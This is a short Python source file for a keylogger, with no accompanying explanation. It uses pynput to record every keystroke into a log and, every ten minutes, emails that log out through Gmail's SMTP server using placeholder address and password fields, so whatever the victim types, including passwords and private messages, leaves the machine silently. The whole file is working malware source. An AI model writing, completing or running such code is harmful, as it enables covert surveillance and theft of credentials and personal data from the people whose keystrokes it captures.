import pynput.keyboard
import threading,smtplib
log =""
def send_mail(email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,msg)
    server.quit()

def process_keyboard(key):
    global log
    try:
        log+=str(" "+key.char+ " ")
    except AttributeError:
        if key == key.space:
            log += str(" ")
        else:
            log+=str(key)

def report():
    global log
    send_mail("<your email>","<your password>",str(log))
    log=""
    timer = threading.Timer(60*10,report)
    timer.start()
keyboard_listner = pynput.keyboard.Listener(on_press=process_keyboard)
with keyboard_listner:
    report()
    keyboard_listner.join()


